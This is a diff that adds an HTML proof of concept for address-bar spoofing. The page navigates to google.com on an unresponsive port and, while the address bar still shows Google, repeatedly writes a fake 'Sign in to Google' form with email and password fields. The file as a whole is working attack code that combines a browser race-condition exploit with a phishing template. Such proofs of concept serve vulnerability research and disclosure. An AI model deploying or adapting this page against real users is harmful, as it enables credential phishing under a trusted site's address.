@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Address Bar Spoofing PoC</title>
+</head>
+<body>
+    <h1>Original Page</h1>
+    <button onclick="spoof()">Click to start Spoof</button>
+
+    <script>
+        function spoof() {
+            // 1. Trigger navigation to a trusted site on a non-existent port
+            // This causes the browser to "hang" while it tries to connect
+            window.location = "https://www.google.com:8080";
+
+            // 2. The Race Condition
+            // While the browser is waiting for the port, we repeatedly 
+            // write new content. The address bar stays on Google.
+            setInterval(function() {
+                document.write('<style>body { font-family: sans-serif; text-align: center; margin-top: 50px; }</style>');
+                document.write('<h1>Sign in to Google</h1>');
+                document.write('<p>Enter your credentials to continue</p>');
+                document.write('<input type="text" placeholder="Email"><br><br>');
+                document.write('<input type="password" placeholder="Password"><br><br>');
+                document.write('<button>Login</button>');
+            }, 10);
+        }
+    </script>
+</body>
+</html>
